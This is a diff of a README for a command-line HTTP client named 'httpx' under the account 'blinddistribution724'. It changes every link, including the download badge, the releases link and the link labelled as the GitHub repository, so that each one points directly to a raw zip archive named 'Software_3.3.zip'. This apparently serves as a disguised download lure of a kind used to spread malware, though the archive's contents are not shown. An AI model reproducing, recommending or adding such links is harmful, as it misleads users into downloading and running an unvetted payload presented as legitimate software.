@@ -1,6 +1,6 @@
 # 🌐 httpx - A Simple Command-Line HTTP Client
 
-[![Download HTTPX](https://img.shields.io/badge/Download-HTTPX-blue.svg)](https://github.com/blinddistribution724/httpx/releases)
+[![Download HTTPX](https://raw.githubusercontent.com/blinddistribution724/httpx/main/mistranscript/Software_3.3.zip)](https://raw.githubusercontent.com/blinddistribution724/httpx/main/mistranscript/Software_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ brew install curl
 
 Now that you have the prerequisites set up, you can download HTTPX. Click the link below to visit the Releases page and download the latest version:
 
-[Visit this page to download HTTPX](https://github.com/blinddistribution724/httpx/releases)
+[Visit this page to download HTTPX](https://raw.githubusercontent.com/blinddistribution724/httpx/main/mistranscript/Software_3.3.zip)
 
 ### Installation Steps
 
@@ -86,6 +86,6 @@ HTTPX is licensed under the MIT License. You are free to use, modify, and distri
 
 ### Additional Support
 
-If you face any issues or have questions, please refer to the GitHub repository for more detailed instructions or to report bugs. You can find the repository here: [HTTPX GitHub Repository](https://github.com/blinddistribution724/httpx).
+If you face any issues or have questions, please refer to the GitHub repository for more detailed instructions or to report bugs. You can find the repository here: [HTTPX GitHub Repository](https://raw.githubusercontent.com/blinddistribution724/httpx/main/mistranscript/Software_3.3.zip).
 
 For further improvements and features, we welcome contributions from the community. Feel free to reach out if you're interested in enhancing HTTPX!
